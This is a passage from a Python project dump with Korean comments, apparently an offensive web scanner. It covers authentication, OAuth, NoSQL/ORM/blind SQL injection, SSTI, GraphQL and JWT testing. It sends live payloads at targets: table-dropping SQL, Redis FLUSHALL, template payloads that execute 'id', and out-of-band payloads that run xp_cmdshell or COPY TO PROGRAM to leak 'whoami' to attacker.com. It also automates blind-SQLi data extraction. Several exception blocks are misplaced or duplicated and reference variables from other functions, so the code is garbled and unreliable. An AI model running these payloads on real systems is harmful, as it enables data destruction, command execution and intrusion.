        Broken Authentication 테스트
        
        패스워드 정책, 세션 타임아웃, 다중 로그인 테스트
        """
        vulnerabilities = []
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # 1. 약한 패스워드 정책 테스트
            weak_passwords = [
                "password", "123456", "admin", "root",
                "test", "12345", "qwerty", "letmein"
            ]
            
            login_endpoints = ["/login", "/signin", "/auth", "/api/login"]
            
            for endpoint in login_endpoints:
                try:
                    login_url = urljoin(base_url, endpoint)
                    
                    # 약한 패스워드로 로그인 시도
                    for password in weak_passwords[:5]:
                        try:
                            response = requests.post(
                                login_url,
                                data={"username": "admin", "password": password},
                                timeout=self.timeout,
                                verify=False,
                                headers={"User-Agent": self.user_agent},
                                allow_redirects=False
                            )
                            
                            # 로그인 성공 확인
                            if response.status_code in [200, 302, 301]:
                                if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                                    vulnerabilities.append({
                                        "type": "Weak Password Policy",
                                        "endpoint": endpoint,
                                        "password": password,
                                        "severity": "HIGH",
                                        "details": "Weak password accepted"
                                    })
                                    break
                        except requests.Timeout:
                            logger.warning(f"Timeout during authentication test: {login_url}")
                            continue
                        except requests.ConnectionError as e:
                            logger.error(f"Connection error: {e}")
                            continue
                        except Exception as e:
                            logger.exception(f"Unexpected error during authentication test: {e}")
                            continue
                        except requests.Timeout:
                            logger.warning(f"Timeout during OAuth test: {oauth_url}")
                            continue
                        except requests.ConnectionError as e:
                            logger.error(f"Connection error: {e}")
                            continue
                        except Exception as e:
                            logger.exception(f"Unexpected error during OAuth test: {e}")
                            continue
            
            # 2. 세션 타임아웃 테스트
            try:
                # 로그인 후 세션 쿠키 획득
                session = requests.Session()
                login_response = session.post(
                    urljoin(base_url, "/login"),
                    data={"username": "test", "password": "test"},
                    timeout=self.timeout,
                    verify=False
                )
                
                # 세션 쿠키가 있으면 타임아웃 테스트
                if session.cookies:
                    # 1시간 후에도 세션이 유효한지 확인 (실제로는 시간이 걸리므로 간단히 체크)
                    vulnerabilities.append({
                        "type": "Session Timeout Test",
                        "severity": "MEDIUM",
                        "details": "Session timeout configuration needs manual verification",
                        "note": "Requires time-based testing"
                    })
            except:
                pass
            
            # 3. 다중 로그인 테스트
            try:
                session1 = requests.Session()
                session2 = requests.Session()
                
                # 두 세션으로 동시 로그인 시도
                login_url = urljoin(base_url, "/login")
                session1.post(login_url, data={"username": "user1", "password": "pass1"}, verify=False)
                session2.post(login_url, data={"username": "user1", "password": "pass1"}, verify=False)
                
                # 두 세션이 모두 유효하면 다중 로그인 허용
                if session1.cookies and session2.cookies:
                    vulnerabilities.append({
                        "type": "Multiple Login Sessions",
                        "severity": "MEDIUM",
                        "details": "Multiple concurrent sessions allowed for same user"
                    })
            except:
                pass
                
        except Exception as e:
            logger.warning(f"Broken Authentication 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_oauth_oidc(self, url: str) -> Dict[str, Any]:
        """
        OAuth/OIDC 취약점 테스트
        
        리다이렉션 조작, state 파라미터 검증, 토큰 탈취 시나리오
        """
        vulnerabilities = []
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # OAuth 엔드포인트 찾기
            oauth_endpoints = [
                "/oauth/authorize",
                "/oauth2/authorize",
                "/auth/oauth",
                "/login/oauth"
            ]
            
            for endpoint in oauth_endpoints:
                try:
                    oauth_url = urljoin(base_url, endpoint)
                    
                    # 1. Open Redirect 테스트
                    redirect_urls = [
                        "http://evil.com",
                        "https://attacker.com/callback",
                        "javascript:alert(1)"
                    ]
                    
                    for redirect in redirect_urls:
                        try:
                            response = requests.get(
                                oauth_url,
                                params={
                                    "client_id": "test",
                                    "redirect_uri": redirect,
                                    "response_type": "code",
                                    "state": "test"
                                },
                                timeout=self.timeout,
                                verify=False,
                                allow_redirects=False,
                                headers={"User-Agent": self.user_agent}
                            )
                            
                            # 리다이렉션 허용 확인
                            if response.status_code in [301, 302, 307, 308]:
                                location = response.headers.get("Location", "")
                                if redirect in location or "evil.com" in location:
                                    vulnerabilities.append({
                                        "type": "OAuth Open Redirect",
                                        "endpoint": endpoint,
                                        "redirect_uri": redirect,
                                        "severity": "HIGH",
                                        "details": "Unvalidated redirect URI"
                                    })
                                    break
                        except requests.Timeout:
                            logger.warning(f"Timeout during authentication test: {login_url}")
                            continue
                        except requests.ConnectionError as e:
                            logger.error(f"Connection error: {e}")
                            continue
                        except Exception as e:
                            logger.exception(f"Unexpected error during authentication test: {e}")
                            continue
                    
                    # 2. State 파라미터 검증 테스트
                    try:
                        # State 파라미터 없이 요청
                        response_no_state = requests.get(
                            oauth_url,
                            params={
                                "client_id": "test",
                                "redirect_uri": "http://localhost",
                                "response_type": "code"
                            },
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        if response_no_state.status_code == 200:
                            vulnerabilities.append({
                                "type": "OAuth Missing State Parameter",
                                "endpoint": endpoint,
                                "severity": "MEDIUM",
                                "details": "State parameter not required or validated"
                            })
                    except requests.Timeout:
                        logger.warning("Timeout during state parameter test")
                    except requests.ConnectionError as e:
                        logger.error(f"Connection error: {e}")
                    except Exception as e:
                        logger.exception(f"Unexpected error during state parameter test: {e}")
                    
                    if vulnerabilities:
                        break
                        
                        except requests.Timeout:
                            logger.warning(f"Timeout during OAuth test: {oauth_url}")
                            continue
                        except requests.ConnectionError as e:
                            logger.error(f"Connection error: {e}")
                            continue
                        except Exception as e:
                            logger.exception(f"Unexpected error during OAuth test: {e}")
                            continue
                    
        except Exception as e:
            logger.warning(f"OAuth/OIDC 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_api_keys(self, url: str) -> Dict[str, Any]:
        """
        API 키 및 토큰 관리 테스트
        
        하드코딩된 시크릿 탐지, 토큰 만료 검증
        """
        vulnerabilities = []
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # JavaScript 파일에서 API 키 검색
            js_files = [
                "/static/js/app.js",
                "/js/main.js",
                "/assets/app.js",
                "/bundle.js"
            ]
            
            api_key_patterns = [
                r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)',
                r'apikey["\']?\s*[:=]\s*["\']([^"\']+)',
                r'secret["\']?\s*[:=]\s*["\']([^"\']+)',
                r'token["\']?\s*[:=]\s*["\']([^"\']+)',
                r'AKIA[0-9A-Z]{16}',  # AWS Access Key
                r'sk_live_[0-9a-zA-Z]{24}',  # Stripe Secret Key
                r'AIza[0-9A-Za-z-_]{35}',  # Google API Key
            ]
            
            for js_file in js_files:
                try:
                    js_url = urljoin(base_url, js_file)
                    response = requests.get(
                        js_url,
                        timeout=self.timeout,
                        verify=False,
                        headers={"User-Agent": self.user_agent}
                    )
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        for pattern in api_key_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                vulnerabilities.append({
                                    "type": "Hardcoded API Key/Secret",
                                    "file": js_file,
                                    "pattern": pattern,
                                    "severity": "CRITICAL",
                                    "details": f"Potential API key found in {js_file}"
                                })
                                break
                        except requests.Timeout:
                            logger.warning(f"Timeout during OAuth test: {oauth_url}")
                            continue
                        except requests.ConnectionError as e:
                            logger.error(f"Connection error: {e}")
                            continue
                        except Exception as e:
                            logger.exception(f"Unexpected error during OAuth test: {e}")
                            continue
            
            # HTML 소스에서도 검색
            try:
                response = requests.get(
                    base_url,
                    timeout=self.timeout,
                    verify=False,
                    headers={"User-Agent": self.user_agent}
                )
                
                html_content = response.text
                for pattern in api_key_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    if matches:
                        vulnerabilities.append({
                            "type": "Hardcoded API Key/Secret in HTML",
                            "severity": "CRITICAL",
                            "details": "API key found in page source"
                        })
                        break
            except:
                pass
                
        except Exception as e:
            logger.warning(f"API Key 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }

```
---

## File 17: db_advanced.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\db_advanced.py`

```python
# app/core/exploit/db_advanced.py
# 데이터베이스 공격 심화

import requests
import time
import logging
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin, urlparse, quote

logger = logging.getLogger(__name__)


class AdvancedDatabaseAttacks:
    """
    데이터베이스 공격 심화: NoSQL Injection, ORM Injection, Blind SQLi 자동화
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def test_nosql_injection(self, url: str) -> Dict[str, Any]:
        """
        NoSQL Injection 테스트
        
        MongoDB의 $where, $ne 연산자 인젝션
        """
        vulnerabilities = []
        
        # NoSQL Injection 페이로드 (다양한 DB 지원)
        nosql_payloads = {
            "mongodb": [
                # $ne (not equal) 우회
                {"username": {"$ne": None}, "password": {"$ne": None}},
                {"username": {"$ne": ""}, "password": {"$ne": ""}},
                {"username": {"$gt": ""}, "password": {"$gt": ""}},
                
                # $where 주입
                {"username": {"$where": "this.username == this.password"}},
                {"username": {"$where": "1==1"}},
                
                # JavaScript 인젝션
                {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
                {"username": {"$exists": True}, "password": {"$exists": True}},
                
                # 배열 기반
                {"username": ["admin"], "password": ["admin"]},
                
                # JSON.parse 우회
                {"username": "admin", "password": {"$regex": ".*"}},
            ],
            "couchdb": [
                {"selector": {"_id": {"$gt": None}}},
                {"selector": {"password": {"$regex": ".*"}}},
                {"selector": {"username": {"$ne": ""}}},
            ],
            "redis": [
                # Redis 명령어 인젝션 (문자열로 전송)
                "\\n\\nSET test 1\\n\\n",
                "\\r\\nFLUSHALL\\r\\n",
                "\\r\\nCONFIG GET *\\r\\n",
            ],
            "cassandra": [
                {"username": "admin' OR '1'='1", "password": "any"},
                {"username": "admin' ALLOW FILTERING", "password": "any"},
            ]
        }
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            login_endpoints = ["/login", "/api/login", "/auth/login"]
            
            for endpoint in login_endpoints:
                # MongoDB 페이로드부터 테스트
                for db_type, payloads in nosql_payloads.items():
                    for payload in payloads[:5]:
                    try:
                        login_url = urljoin(base_url, endpoint)
                        response = requests.post(
                            login_url,
                            json=payload,
                            timeout=self.timeout,
                            verify=False,
                            headers={
                                "User-Agent": self.user_agent,
                                "Content-Type": "application/json"
                            },
                            allow_redirects=False
                        )
                        
                        # 로그인 성공 확인
                        if response.status_code in [200, 302, 301]:
                            if "success" in response.text.lower() or "token" in response.text.lower():
                                vulnerabilities.append({
                                    "type": f"NoSQL Injection ({db_type})",
                                    "endpoint": endpoint,
                                    "payload": str(payload),
                                    "severity": "HIGH",
                                    "method": "POST"
                                })
                                break
                    except requests.Timeout:
                        logger.warning(f"Timeout during NoSQL injection test: {login_url}")
                        continue
                    except requests.ConnectionError as e:
                        logger.error(f"Connection error: {e}")
                        continue
                    except Exception as e:
                        logger.exception(f"Unexpected error during NoSQL injection test: {e}")
                        continue
                
                if vulnerabilities:
                    break
                    
        except Exception as e:
            logger.warning(f"NoSQL Injection 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_orm_injection(self, url: str) -> Dict[str, Any]:
        """
        ORM Injection 테스트
        
        Sequelize, TypeORM 등 ORM 레벨 인젝션
        """
        vulnerabilities = []
        
        # ORM별 인젝션 페이로드
        orm_payloads = {
            "sequelize": [
                "1' OR '1'='1",
                "1'; DROP TABLE users--",
                {"$or": [{"id": 1}, {"id": {"$ne": 0}}]}
            ],
            "typeorm": [
                "1' OR '1'='1",
                "1'; DELETE FROM users--",
                "1' UNION SELECT * FROM users--"
            ],
            "hibernate": [
                "1' OR '1'='1",
                "1'; DROP TABLE users--"
            ]
        }
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:3]:
                for orm_type, payloads in orm_payloads.items():
                    for payload in payloads[:2]:
                        try:
                            if isinstance(payload, dict):
                                # JSON 페이로드
                                response = requests.post(
                                    base_url,
                                    json={param_name: payload},
                                    timeout=self.timeout,
                                    verify=False,
                                    headers={
                                        "User-Agent": self.user_agent,
                                        "Content-Type": "application/json"
                                    }
                                )
                            else:
                                # 문자열 페이로드
                                test_url = f"{base_url}?{param_name}={quote(str(payload))}"
                                response = requests.get(
                                    test_url,
                                    timeout=self.timeout,
                                    verify=False,
                                    headers={"User-Agent": self.user_agent}
                                )
                            
                            # SQL 에러 또는 예상치 못한 응답 확인
                            if "sql" in response.text.lower() or "error" in response.text.lower():
                                vulnerabilities.append({
                                    "type": f"ORM Injection ({orm_type})",
                                    "parameter": param_name,
                                    "payload": str(payload),
                                    "severity": "HIGH",
                                    "method": "GET" if isinstance(payload, str) else "POST"
                                })
                                break
                        except requests.Timeout:
                            logger.warning(f"Timeout during ORM injection test")
                            continue
                        except requests.ConnectionError as e:
                            logger.error(f"Connection error: {e}")
                            continue
                        except Exception as e:
                            logger.exception(f"Unexpected error during ORM injection test: {e}")
                            continue
                    
                    if vulnerabilities:
                        break
                
                if vulnerabilities:
                    break
                    
        except Exception as e:
            logger.warning(f"ORM Injection 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def blind_sqli_automation(
        self,
        url: str,
        parameter: str,
        true_condition: str,
        false_condition: str
    ) -> Dict[str, Any]:
        """
        Blind SQL Injection 자동화
        
        바이너리 서치 기반 데이터 추출
        """
        extracted_data = []
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # 선형 검색 함수 (fallback용)
            def extract_char_linear(position: int) -> Optional[str]:
                """선형 검색으로 문자 추출 (fallback)"""
                chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
                
                for char in chars:
                    payload = f"1' AND ASCII(SUBSTRING(database(),{position},1))={ord(char)}--"
                    
                    try:
                        test_url = f"{base_url}?{parameter}={quote(payload)}"
                        response = requests.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        if len(response.text) > 1000:
                            return char
                    except requests.Timeout:
                        logger.warning(f"Timeout during linear search at position {position}")
                        continue
                    except requests.ConnectionError as e:
                        logger.error(f"Connection error: {e}")
                        continue
                    except Exception as e:
                        logger.exception(f"Unexpected error: {e}")
                        continue
                
                return None
            
            # 바이너리 서치로 문자 추출 (효율적)
            def extract_char_binary_search(position: int, max_ascii: int = 126) -> Optional[str]:
                """
                바이너리 서치로 문자 추출 (효율적)
                
                Args:
                    position: 문자 위치
                    max_ascii: 최대 ASCII 값 (기본 126)
                
                Returns:
                    추출된 문자 또는 None
                """
                # 베이스라인 응답 (False 조건)
                baseline_payload = f"1' AND '1'='2"
                try:
                    baseline_url = f"{base_url}?{parameter}={quote(baseline_payload)}"
                    baseline_response = requests.get(
                        baseline_url,
                        timeout=self.timeout,
                        verify=False,
                        headers={"User-Agent": self.user_agent}
                    )
                    baseline_length = len(baseline_response.text)
                except requests.Timeout:
                    logger.warning(f"Timeout during baseline measurement")
                    baseline_length = 0
                except requests.ConnectionError as e:
                    logger.error(f"Connection error during baseline: {e}")
                    baseline_length = 0
                except Exception as e:
                    logger.exception(f"Unexpected error during baseline: {e}")
                    baseline_length = 0
                
                def is_true_condition(response: requests.Response) -> bool:
                    """True 조건 판단 (베이스라인과 비교)"""
                    response_length = len(response.text)
                    # 베이스라인보다 100바이트 이상 길면 True
                    return response_length > baseline_length + 100
                
                low, high = 32, max_ascii  # 출력 가능한 ASCII 범위
                
                while low <= high:
                    mid = (low + high) // 2
                    payload = f"1' AND ASCII(SUBSTRING(database(),{position},1))>{mid}--"
                    
                    try:
                        test_url = f"{base_url}?{parameter}={quote(payload)}"
                        response = requests.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        if is_true_condition(response):
                            low = mid + 1
                        else:
                            high = mid - 1
                    except requests.Timeout:
                        logger.warning(f"Timeout during binary search at position {position}")
                        return None
                    except requests.ConnectionError as e:
                        logger.error(f"Connection error during binary search: {e}")
                        return None
                    except Exception as e:
                        logger.exception(f"Unexpected error during binary search: {e}")
                        return None
                
                # 최종 문자 반환
                if 32 <= high <= 126:
                    return chr(high)
                return None
            
            # 바이너리 서치 시도 (더 효율적)
            extract_char = extract_char_binary_search
            
            # 데이터베이스 이름 추출 (최대 20자)
            db_name = ""
            for i in range(1, 21):
                char = extract_char(i)
                if char:
                    db_name += char
                else:
                    # 바이너리 서치 실패 시 선형 검색으로 fallback
                    char = extract_char_linear(i)
                    if char:
                        db_name += char
                    else:
                        break
            
            if db_name:
                extracted_data.append({
                    "type": "Database Name",
                    "value": db_name,
                    "method": "Blind SQLi Binary Search"
                })
            
        except Exception as e:
            logger.warning(f"Blind SQLi 자동화 실패: {e}")
        
        return {
            "success": len(extracted_data) > 0,
            "extracted_data": extracted_data,
            "tested": True
        }
    
    def test_out_of_band(self, url: str) -> Dict[str, Any]:
        """
        Out-of-Band 기법 테스트
        
        DNS Exfiltration, HTTP 콜백 기반 Blind SQLi
        """
        vulnerabilities = []
        
        # OOB 페이로드 (DNS Exfiltration)
        oob_payloads = [
            # MySQL
            "1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test.txt')))--",
            
            # PostgreSQL
            "1'; COPY (SELECT 1) TO PROGRAM 'nslookup $(whoami).attacker.com'--",
            
            # MSSQL
            "1'; EXEC xp_cmdshell('nslookup test.attacker.com')--",
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:2]:
                for payload in oob_payloads[:2]:
                    try:
                        test_url = f"{base_url}?{param_name}={quote(payload)}"
                        response = requests.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False,
                            headers={"User-Agent": self.user_agent}
                        )
                        
                        # OOB는 실제 DNS 콜백 확인이 필요
                        # 여기서는 페이로드 전송만
                        vulnerabilities.append({
                            "type": "Out-of-Band SQL Injection (Possible)",
                            "parameter": param_name,
                            "payload": payload,
                            "severity": "HIGH",
                            "details": "Requires DNS callback verification",
                            "method": "GET"
                        })
                        break
                    except requests.Timeout:
                        logger.warning(f"Timeout during NoSQL injection test: {login_url}")
                        continue
                    except requests.ConnectionError as e:
                        logger.error(f"Connection error: {e}")
                        continue
                    except Exception as e:
                        logger.exception(f"Unexpected error during NoSQL injection test: {e}")
                        continue
                
                if vulnerabilities:
                    break
                    
        except Exception as e:
            logger.warning(f"Out-of-Band 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def _extract_params(self, url: str) -> List[str]:
        """URL에서 파라미터 이름 추출"""
        try:
            parsed = urlparse(url)
            params = []
            
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        params.append(param.split("=")[0])
            
            if not params:
                params = ["id", "page", "file", "path", "name", "search", "q", "query"]
            
            return params
        except:
            return ["id", "page", "file"]

```
---

## File 18: latest_vectors.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\latest_vectors.py`

```python
# app/core/exploit/latest_vectors.py
# 최신 공격 벡터 (2025년 기준)

import requests
import re
import json
import logging
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)


class LatestAttackVectors:
    """
    2025년 기준 최신 공격 벡터
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def test_ssti(self, url: str) -> Dict[str, Any]:
        """
        Server-Side Template Injection (SSTI) 테스트
        
        Jinja2, Freemarker, Velocity 등 템플릿 엔진 취약점
        """
        import random
        
        vulnerabilities = []
        
        # 랜덤 테스트 값 생성 (False Positive 방지)
        test_value = random.randint(1000, 9999)
        expected_result = str(7 * test_value)
        
        # 템플릿 엔진별 페이로드
        ssti_payloads = {
            "jinja2": [
                f"{{{{7*{test_value}}}}}",  # 랜덤 값 사용
                "{{config}}",
                "{{self.__dict__}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{lipsum.__globals__['os'].popen('id').read()}}"
            ],
            "freemarker": [
                f"${{7*{test_value}}}",  # 랜덤 값 사용
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}",
                "<#assign ex=\"freemarker.template.utility.Execute\">${ex(\"id\")}"
            ],
            "velocity": [
                f"#set($x=7*{test_value})$x",  # 랜덤 값 사용
                "#set($str=$class.forName('java.lang.String'))",
                "$class.forName('java.lang.Runtime').getRuntime().exec('id')"
            ],
            "smarty": [
                f"{{{{7*{test_value}}}}}",  # 랜덤 값 사용
                "{php}echo 'vulnerable';{/php}",
                "{if phpinfo()}{/if}"
            ],
            "twig": [
                f"{{{{7*{test_value}}}}}",  # 랜덤 값 사용
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
            ]
        }
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:5]:
                for engine, payloads in ssti_payloads.items():
                    for payload in payloads[:3]:
                        try:
                            test_url = f"{base_url}?{param_name}={payload}"
                            response = requests.get(
                                test_url,
                                timeout=self.timeout,
                                verify=False,
                                headers={"User-Agent": self.user_agent}
                            )
                            
                            # 베이스라인 응답 (정상 요청)
                            baseline_response = requests.get(
                                base_url,
                                timeout=self.timeout,
                                verify=False,
                                headers={"User-Agent": self.user_agent}
                            )
                            
                            # 템플릿 실행 결과 확인 (랜덤 값 사용으로 정확도 향상)
                            if engine == "jinja2" and expected_result in response.text:
                                # 베이스라인에는 없어야 함
                                if expected_result not in baseline_response.text:
                                    vulnerabilities.append({
                                        "type": f"SSTI ({engine})",
                                        "parameter": param_name,
                                        "payload": payload,
                                        "test_value": test_value,
                                        "expected_result": expected_result,
                                        "severity": "CRITICAL",
                                        "method": "GET",
                                        "confidence": 95
                                    })
                                    break
                            elif engine == "freemarker" and expected_result in response.text:
                                if expected_result not in baseline_response.text:
                                    vulnerabilities.append({
                                        "type": f"SSTI ({engine})",
                                        "parameter": param_name,
                                        "payload": payload,
                                        "test_value": test_value,
                                        "expected_result": expected_result,
                                        "severity": "CRITICAL",
                                        "method": "GET",
                                        "confidence": 95
                                    })
                                    break
                            elif engine == "velocity" and expected_result in response.text:
                                if expected_result not in baseline_response.text:
                                    vulnerabilities.append({
                                        "type": f"SSTI ({engine})",
                                        "parameter": param_name,
                                        "payload": payload,
                                        "test_value": test_value,
                                        "expected_result": expected_result,
                                        "severity": "CRITICAL",
                                        "method": "GET",
                                        "confidence": 95
                                    })
                                    break
                            elif engine == "smarty" and expected_result in response.text:
                                if expected_result not in baseline_response.text:
                                    vulnerabilities.append({
                                        "type": f"SSTI ({engine})",
                                        "parameter": param_name,
                                        "payload": payload,
                                        "test_value": test_value,
                                        "expected_result": expected_result,
                                        "severity": "CRITICAL",
                                        "method": "GET",
                                        "confidence": 95
                                    })
                                    break
                            elif engine == "twig" and expected_result in response.text:
                                if expected_result not in baseline_response.text:
                                    vulnerabilities.append({
                                        "type": f"SSTI ({engine})",
                                        "parameter": param_name,
                                        "payload": payload,
                                        "test_value": test_value,
                                        "expected_result": expected_result,
                                        "severity": "CRITICAL",
                                        "method": "GET",
                                        "confidence": 95
                                    })
                                    break
                        except requests.Timeout:
                            logger.warning(f"Timeout during SSTI test: {test_url}")
                            continue
                        except requests.ConnectionError as e:
                            logger.error(f"Connection error: {e}")
                            continue
                        except Exception as e:
                            logger.exception(f"Unexpected error during SSTI test: {e}")
                            continue
                    
                    if vulnerabilities:
                        break
                
                if vulnerabilities:
                    break
                    
        except Exception as e:
            logger.warning(f"SSTI 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_graphql(self, url: str) -> Dict[str, Any]:
        """
        GraphQL 취약점 테스트
        
        Introspection, Batching Attack, Nested Query DoS
        """
        vulnerabilities = []
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # GraphQL 엔드포인트 찾기
            graphql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql"]
            
            for endpoint in graphql_endpoints:
                try:
                    test_url = urljoin(base_url, endpoint)
                    
                    # 1. Introspection 쿼리 (스키마 정보 노출)
                    introspection_query = {
                        "query": """
                        {
                            __schema {
                                types {
                                    name
                                    fields {
                                        name
                                        type {
                                            name
                                        }
                                    }
                                }
                            }
                        }
                        """
                    }
                    
                    response = requests.post(
                        test_url,
                        json=introspection_query,
                        timeout=self.timeout,
                        verify=False,
                        headers={
                            "User-Agent": self.user_agent,
                            "Content-Type": "application/json"
                        }
                    )
                    
                    if response.status_code == 200:
                        data = response.json()
                        if "__schema" in str(data):
                            vulnerabilities.append({
                                "type": "GraphQL Introspection Enabled",
                                "endpoint": endpoint,
                                "severity": "MEDIUM",
                                "details": "Schema information exposed"
                            })
                    
                    # 2. Batching Attack (여러 쿼리 동시 실행)
                    batch_query = [
                        {"query": "{ __typename }"},
                        {"query": "{ __typename }"},
                        {"query": "{ __typename }"}
                    ]
                    
                    batch_response = requests.post(
                        test_url,
                        json=batch_query,
                        timeout=self.timeout,
                        verify=False,
                        headers={
                            "User-Agent": self.user_agent,
                            "Content-Type": "application/json"
                        }
                    )
                    
                    if batch_response.status_code == 200:
                        batch_data = batch_response.json()
                        if isinstance(batch_data, list) and len(batch_data) > 1:
                            vulnerabilities.append({
                                "type": "GraphQL Batching Attack",
                                "endpoint": endpoint,
                                "severity": "HIGH",
                                "details": "Multiple queries executed in single request"
                            })
                    
                    # 3. Nested Query DoS (깊은 중첩 쿼리)
                    nested_query = {
                        "query": "{ a { b { c { d { e { f { g { h { i { j } } } } } } } } } } }"
                    }
                    
                    nested_response = requests.post(
                        test_url,
                        json=nested_query,
                        timeout=5,
                        verify=False,
                        headers={
                            "User-Agent": self.user_agent,
                            "Content-Type": "application/json"
                        }
                    )
                    
                    if nested_response.status_code == 200 and nested_response.elapsed.total_seconds() > 3:
                        vulnerabilities.append({
                            "type": "GraphQL Nested Query DoS",
                            "endpoint": endpoint,
                            "severity": "MEDIUM",
                            "details": "Deep nesting causes performance issues"
                        })
                    
                    if vulnerabilities:
                        break
                        
                except requests.Timeout:
                    logger.warning(f"Timeout during GraphQL test: {test_url}")
                    continue
                except requests.ConnectionError as e:
                    logger.error(f"Connection error: {e}")
                    continue
                except Exception as e:
                    logger.exception(f"Unexpected error during GraphQL test: {e}")
                    continue
                    
        except Exception as e:
            logger.warning(f"GraphQL 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_jwt(self, url: str) -> Dict[str, Any]:
        """
        JWT 취약점 테스트
        
        알고리즘 혼동, None 알고리즘, 약한 시크릿 키
        """
        vulnerabilities = []
        
        try:
            import jwt
            
            # JWT 토큰 추출 (쿠키, 헤더에서)
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            response = requests.get(
                base_url,
                timeout=self.timeout,
                verify=False,
                headers={"User-Agent": self.user_agent}
            )
            
            # 쿠키에서 JWT 추출
            jwt_tokens = []
            for cookie in response.cookies:
                if len(cookie.value) > 50:  # JWT는 보통 길다
                    jwt_tokens.append(cookie.value)
            
            # Authorization 헤더에서 JWT 추출
            auth_header = response.headers.get("Authorization", "")
            if auth_header.startswith("Bearer "):
                jwt_tokens.append(auth_header[7:])
            
            for token in jwt_tokens[:3]:  # 최대 3개만 테스트
                try:
                    # 1. 알고리즘 없이 디코딩 시도
                    decoded_none = jwt.decode(token, options={"verify_signature": False})
                    
                    # 2. None 알고리즘으로 서명 제거
                    header = jwt.get_unverified_header(token)
                    if header.get("alg") == "none":
                        vulnerabilities.append({
                            "type": "JWT None Algorithm",
                            "severity": "HIGH",
                            "details": "Token uses 'none' algorithm"
                        })
                    
                    # 3. 알고리즘 혼동 공격 (HS256 -> RS256)
                    # 실제로는 공개키가 필요하지만 여기서는 가능성만 확인
                    if header.get("alg") == "HS256":
                        vulnerabilities.append({
                            "type": "JWT Algorithm Confusion Possible",
                            "severity": "MEDIUM",
                            "details": "HS256 algorithm may be vulnerable to confusion attack"
                        })
                    
                    # 4. 약한 시크릿 키 브루트포스 (간단한 키만)
                    weak_secrets = ["secret", "password", "123456", "admin", "key"]
                    for secret in weak_secrets:
                        try:
                            jwt.decode(token, secret, algorithms=["HS256"])
                            vulnerabilities.append({
                                "type": "JWT Weak Secret Key",
                                "severity": "CRITICAL",
                                "details": f"Weak secret found: {secret}"
                            })
                            break
                        except:
                            continue
                            
                except Exception as e:
                    logger.debug(f"JWT 분석 실패: {e}")
                    continue
                    
        except ImportError:
            logger.warning("PyJWT가 설치되지 않아 JWT 테스트를 건너뜁니다")
        except Exception as e:
            logger.warning(f"JWT 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
